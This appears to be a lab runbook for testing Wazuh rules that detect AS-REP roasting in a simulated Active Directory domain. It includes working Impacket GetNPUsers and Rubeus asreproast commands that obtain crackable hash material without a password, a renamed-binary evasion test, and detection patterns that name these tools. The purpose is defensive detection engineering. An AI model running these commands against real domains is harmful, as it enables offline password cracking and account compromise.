# AS-REP Roasting Detection Commands

## Rule file

```text
rules/asrep_roasting_detection.xml
```

Detection layers:

```text
100410 — successful DC Event 4768 visibility, level 3
100411 — successful pre-authentication-free AS-REP, level 10, T1558.004
100414 — RC4 pre-authentication-free AS-REP, level 12, T1558.004
100412 — any Rubeus.exe execution on WIN01, level 12
100413 — renamed executable using the asreproast verb, level 13
```

Current agents:

```text
DC01: 001
WIN01: 004
```

## Target-state preflight

Run from elevated PowerShell on DC01:

```powershell
Import-Module ActiveDirectory

auditpol.exe /get /subcategory:'Kerberos Authentication Service'

Get-ADUser hannah.reed `
    -Properties Enabled,DoesNotRequirePreAuth,ServicePrincipalName |
    Select-Object `
        SamAccountName,
        Enabled,
        DoesNotRequirePreAuth,
        ServicePrincipalName
```

Expected controlled target state:

```text
Enabled: True
DoesNotRequirePreAuth: True
ServicePrincipalName: empty
```

Do not modify unrelated accounts.

## A01 — targeted Impacket AS-REP request

Run from Kali/Pi with current lab routing. This request needs no target password.

```bash
export DOMAIN='SIMULATION.LOCAL'
export DC_IP='<DC_IP>'
export TARGET='hannah.reed'
export USERS='/tmp/WAZUH_ASREP_USERS.txt'
export OUT='/tmp/WAZUH_ASREP_HASH.txt'

printf '%s\n' "$TARGET" > "$USERS"
rm -f "$OUT"

impacket-GetNPUsers \
  "$DOMAIN/" \
  -dc-ip "$DC_IP" \
  -usersfile "$USERS" \
  -no-pass \
  -format hashcat \
  -outputfile "$OUT"

[ -s "$OUT" ] && echo 'asrep_material_obtained=true'
rm -f "$OUT" "$USERS"
[ ! -e "$OUT" ] && echo 'asrep_material_deleted=true'
```

Expected DC/Wazuh result:

```text
Event ID: 4768
TargetUserName: hannah.reed
Status: 0x0
PreAuthType: 0
TicketEncryptionType: 0x17
Rule: 100414
Level: 12
MITRE: T1558.004
```

Rule `100414` is the RC4 child of `100411`; a non-RC4 pre-authentication-free
AS-REP remains under `100411`, level 10.

## A02 — generic Rubeus execution

Run from the `SIMULATION\yassine.karimi` session on WIN01.

```powershell
$Rubeus = 'C:\Users\yassine.karimi\Rubeus.exe'

Get-FileHash $Rubeus -Algorithm SHA256
& $Rubeus currentluid | Out-Null
"Rubeus exit: $LASTEXITCODE"
```

Expected endpoint result:

```text
Security Event 4688
Rule: 100412
Level: 12
Process: Rubeus.exe
```

Historical PASS: WorkStation record `14712`.

## A03 — renamed non-roasting negative control

```powershell
$Rubeus = 'C:\Users\yassine.karimi\Rubeus.exe'
$Renamed = 'C:\Users\yassine.karimi\updater.exe'

Remove-Item $Renamed -Force -ErrorAction SilentlyContinue
Copy-Item $Rubeus $Renamed -Force

Get-FileHash $Rubeus -Algorithm SHA256
Get-FileHash $Renamed -Algorithm SHA256

& $Renamed currentluid | Out-Null
"Renamed tool exit: $LASTEXITCODE"

Remove-Item $Renamed -Force
'Renamed cleanup: ' + (-not (Test-Path $Renamed))
```

Expected endpoint result:

```text
Security Event 4688 remains available
100412 must not fire because image is not Rubeus.exe
100413 must not fire because command lacks asreproast
```

## A04 — direct Rubeus AS-REP request

```powershell
$Rubeus = 'C:\Users\yassine.karimi\Rubeus.exe'

& $Rubeus asreproast /user:hannah.reed /domain:SIMULATION.LOCAL /dc:DC01.SIMULATION.LOCAL /nowrap |
    Out-Null

"Rubeus exit: $LASTEXITCODE"
```

Expected chain:

```text
WIN01 Security 4688 → rule 100412, level 12
DC01 Security 4768  → rule 100414, level 12, T1558.004
```

Do not use `/outfile`; do not crack or replay returned material.

## A05 — renamed Rubeus AS-REP request

```powershell
$Rubeus = 'C:\Users\yassine.karimi\Rubeus.exe'
$Renamed = 'C:\Users\yassine.karimi\updater.exe'

Remove-Item $Renamed -Force -ErrorAction SilentlyContinue
Copy-Item $Rubeus $Renamed -Force

& $Renamed asreproast /user:hannah.reed /domain:SIMULATION.LOCAL /dc:DC01.SIMULATION.LOCAL /nowrap |
    Out-Null

"Renamed AS-REP exit: $LASTEXITCODE"
Remove-Item $Renamed -Force
```

Expected chain:

```text
WIN01 Security 4688 → rule 100413, level 13
DC01 Security 4768  → rule 100414, level 12, T1558.004
```

## A06 — normal TGT negative control

Run as an ordinary account that requires Kerberos pre-authentication.

```powershell
klist.exe purge
dir \\DC01\SYSVOL | Out-Null
klist.exe tickets
```

Expected:

```text
Normal Event 4768 may match 100410 at level 3
100411 must not fire because PreAuthType is not 0
```

## Endpoint Event 4688 verification

Set `$Start` immediately before a Rubeus test.

```powershell
$Start = Get-Date

Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4688
    StartTime = $Start
} | Where-Object Message -Match 'Rubeus|updater|asreproast|currentluid' |
    Select-Object TimeCreated, RecordId, Message
```

## DC Event 4768 verification

```powershell
$Start = Get-Date

Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4768
    StartTime = $Start
} | Select-Object TimeCreated, RecordId, Message
```

Record:

```text
TargetUserName
Status
PreAuthType
TicketEncryptionType
IpAddress
EventRecordID
```

## Dashboard filters

DC behavior:

```text
agent.id:001 AND rule.id:(100410 OR 100411 OR 100414)
```

Endpoint process and renamed-tool behavior:

```text
agent.id:004 AND rule.id:(100412 OR 100413)
```

Correlated chain:

```text
(rule.id:(100411 OR 100414) AND agent.id:001) OR (rule.id:(100412 OR 100413) AND agent.id:004)
```

## Cleanup

```powershell
Remove-Item 'C:\Users\yassine.karimi\updater.exe' `
    -Force -ErrorAction SilentlyContinue
klist.exe purge
```

```bash
rm -f /tmp/WAZUH_ASREP_USERS.txt /tmp/WAZUH_ASREP_HASH.txt
```

## Optional target restoration

Only when intentionally closing the AS-REP lab target:

```powershell
Set-ADAccountControl `
    -Identity hannah.reed `
    -DoesNotRequirePreAuth $false

Get-ADUser hannah.reed -Properties DoesNotRequirePreAuth |
    Select-Object SamAccountName,DoesNotRequirePreAuth
```

During the active lab phase, `hannah.reed` remains the dedicated
pre-authentication-disabled target.
